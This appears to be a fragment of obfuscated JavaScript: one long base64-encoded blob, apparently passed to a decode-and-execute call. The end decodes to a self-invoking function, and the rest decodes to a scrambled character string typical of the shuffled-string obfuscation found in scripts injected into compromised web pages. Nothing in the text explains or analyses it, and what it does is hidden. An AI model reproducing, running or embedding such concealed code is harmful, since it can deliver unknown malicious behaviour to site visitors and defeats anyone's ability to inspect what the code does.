ZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
